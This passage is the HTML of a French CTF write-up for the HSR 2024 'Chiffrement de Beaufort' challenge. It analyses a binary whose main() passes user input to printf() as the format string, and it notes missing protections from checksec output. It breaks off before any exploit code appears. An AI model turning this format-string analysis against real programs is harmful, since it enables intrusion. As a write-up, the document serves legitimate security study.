@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Chiffrement de Beaufort -  HSR 2024 - MyLittlePwney</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="Binary AnalysisPour analyser le binaire, on va commencer par l&rsquo;ouvrir avec un décompilo, comme Binja. Le binaire n&rsquo;étant pas strippé, on peut s&rsquo;aider des symboles pour deviner ce que fait chaque fonction. A part la fonction backdoor() qui aspire à servir de fonction win(), le nom des fonctions ne nous apporte rien d&rsquo;intéressant. Regardons un peu plus en détail ce que fait le programme.
+Main()Tout d&rsquo;abord, la fonction main() va lire l&rsquo;entrée standard à 2 reprises, attendant de l&rsquo;utilisateur qu&rsquo;il envoie une chaine de maximum 0x64 caractères." /><meta name="keywords" content='pwn, format_string, HSR, writeups' />
+  <meta itemprop="name" content="Chiffrement de Beaufort -  HSR 2024">
+  <meta itemprop="description" content="Binary AnalysisPour analyser le binaire, on va commencer par l&rsquo;ouvrir avec un décompilo, comme Binja. Le binaire n&rsquo;étant pas strippé, on peut s&rsquo;aider des symboles pour deviner ce que fait chaque fonction. A part la fonction backdoor() qui aspire à servir de fonction win(), le nom des fonctions ne nous apporte rien d&rsquo;intéressant. Regardons un peu plus en détail ce que fait le programme.
+Main()Tout d&rsquo;abord, la fonction main() va lire l&rsquo;entrée standard à 2 reprises, attendant de l&rsquo;utilisateur qu&rsquo;il envoie une chaine de maximum 0x64 caractères.">
+  <meta itemprop="datePublished" content="2024-04-01T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-04-01T00:00:00+00:00">
+  <meta itemprop="wordCount" content="708">
+  <meta itemprop="image" content="http://my.littlepwney.fr/image/logo.png">
+  <meta itemprop="keywords" content="Pwn,Format_string,HSR,Writeups"><meta property="og:url" content="http://my.littlepwney.fr/writeups/hacksecureims/chiffrement_de_beaufort/">
+  <meta property="og:site_name" content="MyLittlePwney">
+  <meta property="og:title" content="Chiffrement de Beaufort -  HSR 2024">
+  <meta property="og:description" content="Binary AnalysisPour analyser le binaire, on va commencer par l&amp;rsquo;ouvrir avec un décompilo, comme Binja. Le binaire n&amp;rsquo;étant pas strippé, on peut s&amp;rsquo;aider des symboles pour deviner ce que fait chaque fonction. A part la fonction backdoor() qui aspire à servir de fonction win(), le nom des fonctions ne nous apporte rien d&amp;rsquo;intéressant. Regardons un peu plus en détail ce que fait le programme.
+Main()Tout d&amp;rsquo;abord, la fonction main() va lire l&amp;rsquo;entrée standard à 2 reprises, attendant de l&amp;rsquo;utilisateur qu&amp;rsquo;il envoie une chaine de maximum 0x64 caractères.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+  <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-04-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-04-01T00:00:00+00:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Format_string">
+    <meta property="article:tag" content="HSR">
+    <meta property="article:tag" content="Writeups">
+    <meta property="og:image" content="http://my.littlepwney.fr/image/logo.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://my.littlepwney.fr/image/logo.png"><meta name="twitter:title" content="Chiffrement de Beaufort -  HSR 2024">
+<meta name="twitter:description" content="Binary AnalysisPour analyser le binaire, on va commencer par l&rsquo;ouvrir avec un décompilo, comme Binja. Le binaire n&rsquo;étant pas strippé, on peut s&rsquo;aider des symboles pour deviner ce que fait chaque fonction. A part la fonction backdoor() qui aspire à servir de fonction win(), le nom des fonctions ne nous apporte rien d&rsquo;intéressant. Regardons un peu plus en détail ce que fait le programme.
+Main()Tout d&rsquo;abord, la fonction main() va lire l&rsquo;entrée standard à 2 reprises, attendant de l&rsquo;utilisateur qu&rsquo;il envoie une chaine de maximum 0x64 caractères.">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://my.littlepwney.fr/writeups/hacksecureims/chiffrement_de_beaufort/" /><link rel="prev" href="http://my.littlepwney.fr/pwn/kernel/attacks/buffer-overflow-basic/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Chiffrement de Beaufort -  HSR 2024",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/my.littlepwney.fr\/writeups\/hacksecureims\/chiffrement_de_beaufort\/"
+    },"genre": "writeups","keywords": "pwn, format_string, HSR, writeups","wordcount":  708 ,
+    "url": "http:\/\/my.littlepwney.fr\/writeups\/hacksecureims\/chiffrement_de_beaufort\/","datePublished": "2024-04-01T00:00:00+00:00","dateModified": "2024-04-01T00:00:00+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Author"
+      },"description": ""
+  }
+  </script><link rel="stylesheet" type="" href="/css/custom.css">
+  </head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper" data-github-corner="right">
+    <div class="header-title">
+      <a href="/" title="MyLittlePwney"><img loading="lazy" src="/images/logo.png" alt="MyLittlePwney" data-title="MyLittlePwney" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">MyLittlePwney</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a
+                class="menu-link"
+                href="/writeups/"
+                title="CTF Writeups"
+                
+              ><i class="fa-solid fa-flag fa-fw fa-sm" aria-hidden="true"></i> Writeups</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/writeups/fcsc/"
+                          title="France Cyber Security Challenge"
+                          
+                        ><i class="fa-solid fa-medal fa-fw fa-sm" aria-hidden="true"></i> FCSC</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/writeups/hacksecureims/"
+                          title="HackSecuReims"
+                          
+                        ><i class="fa-solid fa-skull-crossbones fa-fw fa-sm" aria-hidden="true"></i> HSR</a>
+                      </li></ul></li><li class="menu-item has-children">
+              <a
+                class="menu-link"
+                href="/pwn/"
+                
+                
+              ><i class="fa-solid fa-bug fa-fw fa-sm" aria-hidden="true"></i> Pwn</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/buffer-overflow/"
+                          
+                          
+                        ><i class="fa-brands fa-stack-overflow fa-fw fa-sm" aria-hidden="true"></i> Buffer Overflow</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/format-strings/"
+                          
+                          
+                        ><i class="fa-solid fa-file-code fa-fw fa-sm" aria-hidden="true"></i> Format Strings</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/heap-attacks/"
+                          
+                          
+                        ><i class="fa-solid fa-trash-can fa-fw fa-sm" aria-hidden="true"></i> Heap Attacks</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/io-attacks/"
+                          
+                          
+                        ><i class="fa-solid fa-code-compare fa-fw fa-sm" aria-hidden="true"></i> IO Attacks</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/shellcoding/"
+                          
+                          
+                        ><i class="fa-solid fa-microchip fa-fw fa-sm" aria-hidden="true"></i> Shellcoding</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/kernel/"
+                          
+                          
+                        ><i class="fa-solid fa-gear fa-fw fa-sm" aria-hidden="true"></i> Kernel</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/#"
+                          
+                          
+                        >-------------------------</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/linux-internals/"
+                          
+                          
+                        ><i class="fa-brands fa-linux fa-fw fa-sm" aria-hidden="true"></i> Linux Internals</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/windows-internals/"
+                          
+                          
+                        ><i class="fa-brands fa-windows fa-fw fa-sm" aria-hidden="true"></i> Windows Internals</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/android-internals/"
+                          
+                          
+                        ><i class="fa-brands fa-android fa-fw fa-sm" aria-hidden="true"></i> Android Internals</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/#"
+                          
+                          
+                        >-------------------------</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/fuzzing/"
+                          
+                          
+                        ><i class="fa-solid fa-bug-slash fa-fw fa-sm" aria-hidden="true"></i> Fuzzing</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/browser-exploitation/"
+                          
+                          
+                        ><i class="fa-brands fa-chrome fa-fw fa-sm" aria-hidden="true"></i> Browser Exploitation</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/#"
+                          
+                          
+                        >-------------------------</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/cheat-sheets/"
+                          
+                          
+                        ><i class="fa-solid fa-file-lines fa-fw fa-sm" aria-hidden="true"></i> Cheat Sheets</a>
+                      </li></ul></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/reverse/"
+                
+                
+              ><i class="fa-solid fa-gears fa-fw fa-sm" aria-hidden="true"></i> Reverse</a></li><li class="menu-item has-children">
+              <a
+                class="menu-link"
+                href="/web/"
+                
+                
+              ><i class="fa-solid fa-spider fa-fw fa-sm" aria-hidden="true"></i> Web</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/web/sql-injections/"
+                          
+                          
+                        ><i class="fa-solid fa-syringe fa-fw fa-sm" aria-hidden="true"></i> SQL Injections</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/web/nosql-injections/"
+                          
+                          
+                        ><i class="fa-solid fa-database fa-fw fa-sm" aria-hidden="true"></i> NoSQL Injections</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/web/jwt-attacks/"
+                          
+                          
+                        ><i class="fa-solid fa-cookie fa-fw fa-sm" aria-hidden="true"></i> JWT Attacks</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/web/graphql-api/"
+                          
+                          
+                        ><i class="fa-solid fa-circle-nodes fa-fw fa-sm" aria-hidden="true"></i> GraphQL API</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/web/insecure-deserialization/"
+                          
+                          
+                        ><i class="fa-solid fa-file-zipper fa-fw fa-sm" aria-hidden="true"></i> Insecure Deserialization</a>
+                      </li></ul></li><li class="menu-item has-children">
+              <a
+                class="menu-link"
+                href="/crypto/"
+                
+                
+              ><i class="fa-solid fa-lock fa-fw fa-sm" aria-hidden="true"></i> Crypto</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/crypto/maths/"
+                          
+                          
+                        ><i class="fa-solid fa-square-root-variable fa-fw fa-sm" aria-hidden="true"></i> Maths</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/crypto/aes/"
+                          
+                          
+                        ><i class="fa-solid fa-arrows-left-right-to-line fa-fw fa-sm" aria-hidden="true"></i> AES</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/crypto/rsa/"
+                          
+                          
+                        ><i class="fa-solid fa-key fa-fw fa-sm" aria-hidden="true"></i> RSA</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/crypto/diffie-hellman/"
+                          
+                          
+                        ><i class="fa-solid fa-superscript fa-fw fa-sm" aria-hidden="true"></i> Diffie-Hellman</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/crypto/elliptic-curves/"
+                          
+                          
+                        ><i class="fa-solid fa-wave-square fa-fw fa-sm" aria-hidden="true"></i> Elliptic Curves</a>
+                      </li></ul></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="MyLittlePwney"><img loading="lazy" src="/images/logo.png" alt="/images/logo.png" data-title="/images/logo.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">MyLittlePwney</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li
+              class="menu-item"
+            ><span class="nested-item">
+                  <a
+                    class="menu-link"
+                    href="/writeups/"
+                    title="CTF Writeups"
+                    
+                  ><i class="fa-solid fa-flag fa-fw fa-sm" aria-hidden="true"></i> Writeups</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/writeups/fcsc/"
+                          title="France Cyber Security Challenge"
+                          
+                        ><i class="fa-solid fa-medal fa-fw fa-sm" aria-hidden="true"></i> FCSC</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/writeups/hacksecureims/"
+                          title="HackSecuReims"
+                          
+                        ><i class="fa-solid fa-skull-crossbones fa-fw fa-sm" aria-hidden="true"></i> HSR</a>
+                      </li></ul></li><li
+              class="menu-item"
+            ><span class="nested-item">
+                  <a
+                    class="menu-link"
+                    href="/pwn/"
+                    
+                    
+                  ><i class="fa-solid fa-bug fa-fw fa-sm" aria-hidden="true"></i> Pwn</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/buffer-overflow/"
+                          
+                          
+                        ><i class="fa-brands fa-stack-overflow fa-fw fa-sm" aria-hidden="true"></i> Buffer Overflow</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/format-strings/"
+                          
+                          
+                        ><i class="fa-solid fa-file-code fa-fw fa-sm" aria-hidden="true"></i> Format Strings</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/heap-attacks/"
+                          
+                          
+                        ><i class="fa-solid fa-trash-can fa-fw fa-sm" aria-hidden="true"></i> Heap Attacks</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/io-attacks/"
+                          
+                          
+                        ><i class="fa-solid fa-code-compare fa-fw fa-sm" aria-hidden="true"></i> IO Attacks</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/shellcoding/"
+                          
+                          
+                        ><i class="fa-solid fa-microchip fa-fw fa-sm" aria-hidden="true"></i> Shellcoding</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/kernel/"
+                          
+                          
+                        ><i class="fa-solid fa-gear fa-fw fa-sm" aria-hidden="true"></i> Kernel</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/#"
+                          
+                          
+                        >-------------------------</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/linux-internals/"
+                          
+                          
+                        ><i class="fa-brands fa-linux fa-fw fa-sm" aria-hidden="true"></i> Linux Internals</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/windows-internals/"
+                          
+                          
+                        ><i class="fa-brands fa-windows fa-fw fa-sm" aria-hidden="true"></i> Windows Internals</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/android-internals/"
+                          
+                          
+                        ><i class="fa-brands fa-android fa-fw fa-sm" aria-hidden="true"></i> Android Internals</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/#"
+                          
+                          
+                        >-------------------------</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/fuzzing/"
+                          
+                          
+                        ><i class="fa-solid fa-bug-slash fa-fw fa-sm" aria-hidden="true"></i> Fuzzing</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/browser-exploitation/"
+                          
+                          
+                        ><i class="fa-brands fa-chrome fa-fw fa-sm" aria-hidden="true"></i> Browser Exploitation</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/#"
+                          
+                          
+                        >-------------------------</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/pwn/cheat-sheets/"
+                          
+                          
+                        ><i class="fa-solid fa-file-lines fa-fw fa-sm" aria-hidden="true"></i> Cheat Sheets</a>
+                      </li></ul></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/reverse/"
+                  
+                  
+                ><i class="fa-solid fa-gears fa-fw fa-sm" aria-hidden="true"></i> Reverse</a></li><li
+              class="menu-item"
+            ><span class="nested-item">
+                  <a
+                    class="menu-link"
+                    href="/web/"
+                    
+                    
+                  ><i class="fa-solid fa-spider fa-fw fa-sm" aria-hidden="true"></i> Web</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/web/sql-injections/"
+                          
+                          
+                        ><i class="fa-solid fa-syringe fa-fw fa-sm" aria-hidden="true"></i> SQL Injections</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/web/nosql-injections/"
+                          
+                          
+                        ><i class="fa-solid fa-database fa-fw fa-sm" aria-hidden="true"></i> NoSQL Injections</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/web/jwt-attacks/"
+                          
+                          
+                        ><i class="fa-solid fa-cookie fa-fw fa-sm" aria-hidden="true"></i> JWT Attacks</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/web/graphql-api/"
+                          
+                          
+                        ><i class="fa-solid fa-circle-nodes fa-fw fa-sm" aria-hidden="true"></i> GraphQL API</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/web/insecure-deserialization/"
+                          
+                          
+                        ><i class="fa-solid fa-file-zipper fa-fw fa-sm" aria-hidden="true"></i> Insecure Deserialization</a>
+                      </li></ul></li><li
+              class="menu-item"
+            ><span class="nested-item">
+                  <a
+                    class="menu-link"
+                    href="/crypto/"
+                    
+                    
+                  ><i class="fa-solid fa-lock fa-fw fa-sm" aria-hidden="true"></i> Crypto</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/crypto/maths/"
+                          
+                          
+                        ><i class="fa-solid fa-square-root-variable fa-fw fa-sm" aria-hidden="true"></i> Maths</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/crypto/aes/"
+                          
+                          
+                        ><i class="fa-solid fa-arrows-left-right-to-line fa-fw fa-sm" aria-hidden="true"></i> AES</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/crypto/rsa/"
+                          
+                          
+                        ><i class="fa-solid fa-key fa-fw fa-sm" aria-hidden="true"></i> RSA</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/crypto/diffie-hellman/"
+                          
+                          
+                        ><i class="fa-solid fa-superscript fa-fw fa-sm" aria-hidden="true"></i> Diffie-Hellman</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/crypto/elliptic-curves/"
+                          
+                          
+                        ><i class="fa-solid fa-wave-square fa-fw fa-sm" aria-hidden="true"></i> Elliptic Curves</a>
+                      </li></ul></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><article class="page single special">
+    <div class="header"><h1 class="single-title animate__animated animate__pulse animate__faster">Chiffrement de Beaufort -  HSR 2024</h1></div><div
+      class="content"
+      id="content"
+      
+      
+    ><h2 id="binary-analysis" class="heading-element">
+  <a href="#binary-analysis" class="heading-mark"></a>Binary Analysis</h2><p>Pour analyser le binaire, on va commencer par l&rsquo;ouvrir avec un décompilo, comme <strong>Binja</strong>. Le binaire n&rsquo;étant pas strippé, on peut s&rsquo;aider des symboles pour deviner ce que fait chaque fonction.
+<img loading="lazy" src="/images/beaufort_symbols.png" alt="Malloc from Top Chunk" srcset="/images/beaufort_symbols.png?size=small, /images/beaufort_symbols.png?size=medium 1.5x, /images/beaufort_symbols.png?size=large 2x" sizes="auto" data-title="Malloc from Top Chunk" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>A part la fonction <em>backdoor()</em> qui aspire à servir de fonction <em>win()</em>, le nom des fonctions ne nous apporte rien d&rsquo;intéressant.
+Regardons un peu plus en détail ce que fait le programme.</p>
+<h3 id="main" class="heading-element">
+  <a href="#main" class="heading-mark"></a>Main()</h3><p>Tout d&rsquo;abord, la fonction <em>main()</em> va lire l&rsquo;entrée standard à 2 reprises, attendant de l&rsquo;utilisateur qu&rsquo;il envoie une chaine de maximum 0x64 caractères. Ensuite elle va stocker ces entrées dans 2 buffers, puis appeler la fonction <em>beaufortCipher()</em> avec ces 2 buffers en paramètres.
+<img loading="lazy" src="/images/beaufort_main1.png" alt="Malloc from Top Chunk" srcset="/images/beaufort_main1.png?size=small, /images/beaufort_main1.png?size=medium 1.5x, /images/beaufort_main1.png?size=large 2x" sizes="auto" data-title="Malloc from Top Chunk" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="beaufortcipher" class="heading-element">
+  <a href="#beaufortcipher" class="heading-mark"></a>beaufortCipher()</h3><p>Quant à la fonction <em>cipherBeaufort()</em>, comme son nom l&rsquo;indique, elle applique un chiffrement de <strong>Beaufort</strong> sur notre première input. La clé utilisée pour chiffrer le buffer est enfait notre 2ème input.
+<img loading="lazy" src="/images/beaufort_cipher.png" alt="Malloc from Top Chunk" srcset="/images/beaufort_cipher.png?size=small, /images/beaufort_cipher.png?size=medium 1.5x, /images/beaufort_cipher.png?size=large 2x" sizes="auto" data-title="Malloc from Top Chunk" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="end-of-main" class="heading-element">
+  <a href="#end-of-main" class="heading-mark"></a>End of main()</h3><p>Une fois que notre input a été chiffrée avec la clé qu&rsquo;on donne au programme, la fonction <em>main()</em> affiche le buffer chiffré, puis la clé qu&rsquo;on lui a donné.
+Et c&rsquo;est ici que se trouve la vuln.</p>
+<p>En effet, le <em>printf()</em> que le programme appel pour afficher notre clé prend directement la clé comme premier argument. Ainsi notre input (la clé) est interpetée, par <em>printf()</em>, comme étant le formatteur.
+Le programme est donc vulnérable à une format string.</p>
+<p><img loading="lazy" src="/images/beaufort_main2.png" alt="Malloc from Top Chunk" srcset="/images/beaufort_main2.png?size=small, /images/beaufort_main2.png?size=medium 1.5x, /images/beaufort_main2.png?size=large 2x" sizes="auto" data-title="Malloc from Top Chunk" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="theorycraft" class="heading-element">
+  <a href="#theorycraft" class="heading-mark"></a>Theorycraft</h2><p>Maintenant réfléchissons à comment on va exploiter la vuln. Si on fait un <strong>checksec</strong>, on remarque que le binaire n&rsquo;a ni <strong>PIE</strong>, ni <strong>RelRO</strong>.</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Canary  :    ✘ 
+</span></span><span class="line"><span class="cl">NX      :    ✓ 
+</span></span><span class="line"><span class="cl">PIE     :    ✘ 
